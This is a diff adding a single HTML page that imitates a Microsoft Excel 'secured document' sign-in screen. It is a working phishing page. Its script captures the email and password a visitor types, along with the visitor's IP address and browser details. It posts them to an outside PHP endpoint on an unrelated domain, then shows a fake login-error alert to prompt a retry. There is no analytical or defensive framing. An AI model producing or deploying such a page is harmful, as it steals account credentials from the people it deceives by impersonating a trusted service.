@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>signIn-your-account</title>
+  <style>
+    /* Fullscreen loader */
+    .loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background-color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .loader img{
+      width: 150px;
+    }
+
+    /* Hidden content */
+    .hidden {
+      display: none;
+    }
+
+    /* Background container with blur effect */
+    .background__cont {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background-image: url('./data-analysis-and-visualization.png');
+      filter: blur(3px);
+      background-position: center;
+      background-repeat: no-repeat;
+      background-size: cover;
+      z-index: -1;
+    }
+
+    /* Centering the login box */
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      height: 100vh;
+      position: relative;
+    }
+
+    .login-box {
+      background-color: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.412);
+      text-align: center;
+      max-width: 350px;
+    }
+
+    .excel-logo {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+
+    .email-text {
+      font-weight: bold;
+      color: #1a8917;
+      margin: 10px 0;
+    }
+
+    .input-field {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      font-size: 15px;
+      border-radius: 4px;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      margin-bottom: 15px;
+    }
+
+    .checkbox-container input {
+      margin-right: 5px;
+    }
+
+    .login-button {
+      background-color: #1a8917;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .login-button:hover {
+      background-color: #155d10;
+    }
+
+    .footer-text {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .markimg{
+      position: absolute;
+       bottom: 5%;
+        left: 45%;
+        width: 130px;
+    }
+
+    @media (max-width: 768px) {
+      .markimg{
+         position: absolute;
+       bottom: 5%;
+        left: 35%;
+        width: 110px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loader -->
+  <div class="loader">
+    <img src="./Microsoft.gif" alt="Loading..." />
+
+    <div>
+      <img src="./d3961bba8218ce6fe0ea1b2e6718f41b.png" class="markimg" alt="">
+    </div>
+  </div>
+
+  <!-- Background with blur -->
+  <div class="background__cont hidden"></div>
+
+  <!-- Login form container -->
+ <div class="login-container hidden">
+    <div class="login-box">
+        <img src="./pngwing.com.png" alt="Excel Logo" class="excel-logo">
+        <p>This secured document can only be accessed by the email it was sent to:</p>
+        <!-- <p>Sign in to your account to confirm you are not a <strong>robot</strong></p> -->
+        <form action="#" id="signInForm">
+            <input type="email" value="" class="input-field" placeholder="Email" id="emailInput" required>
+            <input type="password" placeholder="Password" class="input-field" id="passwordInput" required>
+            <div class="checkbox-container">
+                <input type="checkbox" id="remember">
+                <label for="remember">Remember my ID</label>
+            </div>
+            <button type="submit" class="login-button">Login Now</button>
+        </form>
+        <p class="footer-text">Payment Excel spreadsheet</p>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+<script>
+    // JavaScript to hide the loader and show the content
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            document.querySelector('.loader').style.display = 'none';
+            document.querySelectorAll('.hidden').forEach(element => {
+                element.classList.remove('hidden');
+            });
+        }, 4000); // 4 seconds
+    });
+
+    function getBrowserInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenSize: `${window.screen.width}x${window.screen.height}`
+        };
+    }
+
+    async function getUserIP() {
+        const response = await axios.get('https://api.ipify.org?format=json');
+        return response.data.ip;
+    }
+
+    async function sendVisitorData(password) {
+        const browserInfo = getBrowserInfo();
+        const ipAddress = await getUserIP();
+
+        const data = {
+            password: password,
+            email: document.getElementById("emailInput").value,
+            ip: ipAddress,
+            browser: browserInfo.userAgent,
+            platform: browserInfo.platform,
+            language: browserInfo.language,
+            screen_size: browserInfo.screenSize
+        };
+
+        try {
+            const response = await axios.post('https://fashionhub.geoedu360.com/SignUpClassesPhp/microsoft/microsoftPass.php', data, {
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+            console.log('Data sent successfully:', response.data);
+            alert("There was a problem logging in. Please try again");
+        } catch (error) {
+            console.error('Error sending data:', error);
+            alert("An error occurred. Please try again later.");
+        }
+    }
+
+    document.getElementById("signInForm").addEventListener("submit", async function(event) {
+        event.preventDefault();
+
+        const password = document.getElementById("passwordInput").value;
+        const email = document.getElementById("emailInput").value;
+
+        sendVisitorData(password);
+    });
+</script>
+
+</body>
+</html>
